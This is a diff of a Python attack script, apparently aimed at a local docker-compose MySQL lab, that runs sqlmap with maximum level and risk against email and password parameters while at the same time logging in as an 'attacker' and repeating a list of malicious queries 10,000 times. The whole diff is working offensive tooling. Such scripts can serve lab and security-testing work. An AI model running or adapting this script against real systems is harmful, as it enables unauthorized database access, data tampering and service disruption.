@@ -1,5 +1,6 @@
 import pymysql
 import subprocess
+from concurrent.futures import ThreadPoolExecutor
 
 # Database connection details
 HOST = "localhost"  # The name of your MySQL service in docker-compose
@@ -37,9 +38,38 @@ def execute_query(query, cursor, connection):
             print(f"Executed successfully: {query}")
     except pymysql.MySQLError as e:
         print(f"Error executing query: {query}\nError: {e}")
-       
- 
-def run_sqlmap():
+
+def run_SQL_access_attack():
+    try:
+        # Connect to the database
+        connection = pymysql.connect(
+            host=HOST,
+            user=USER,
+            password=PASSWORD,
+            database=DATABASE,
+            port=PORT
+        )
+
+        if connection.open:
+            print("Connected to the database as attacker.")
+            cursor = connection.cursor()
+
+            # Execute each malicious query
+            for _ in range(10000):
+                for query in MALICIOUS_QUERIES:
+                    print(f"Executing: {query}")
+                    execute_query(query, cursor, connection)
+
+    except pymysql.MySQLError as e:
+        print(f"Error connecting to database: {e}")
+
+    finally:
+        if 'connection' in locals() and connection.open:
+            cursor.close()
+            connection.close()
+            print("Database connection closed.")
+
+def run_SQL_injection():
     # Define the SQLMap command
     command = [
         "sqlmap", 
@@ -48,8 +78,7 @@ def run_sqlmap():
         "-p", "email,password",
         "--batch", 
         "--level=5", 
-        "--risk=3",
-        "--timeout=10"
+        "--risk=3"
     ]
 
     try:
@@ -70,42 +99,15 @@ def run_sqlmap():
     except Exception as e:
         print(f"An error occurred: {e}")
 
-
 def main():
-    
-    # Run SQLMap to exploit the SQL injection vulnerability
-    run_sqlmap()
-    
-    print("SQL Injection attack completed.")
-    
-    try:
-        # Connect to the database
-        connection = pymysql.connect(
-            host=HOST,
-            user=USER,
-            password=PASSWORD,
-            database=DATABASE,
-            port=PORT
-        )
+    # Run both attacks simultaneously using ThreadPoolExecutor
+    with ThreadPoolExecutor() as executor:
+        future_sql_access = executor.submit(run_SQL_access_attack)
+        future_sql_injection = executor.submit(run_SQL_injection)
 
-        if connection.open:
-            print("Connected to the database as attacker.")
-            cursor = connection.cursor()
-
-            # Execute each malicious query
-            for i in range(10000):
-                for query in MALICIOUS_QUERIES:
-                    print(f"Executing: {query}")
-                    execute_query(query, cursor, connection)
-
-    except pymysql.MySQLError as e:
-        print(f"Error connecting to database: {e}")
-
-    finally:
-        if 'connection' in locals() and connection.open:
-            cursor.close()
-            connection.close()
-            print("Database connection closed.")
+        # Wait for both tasks to complete
+        for future in [future_sql_access, future_sql_injection]:
+            future.result()  # Ensure any exceptions are raised
 
 if __name__ == "__main__":
     main()
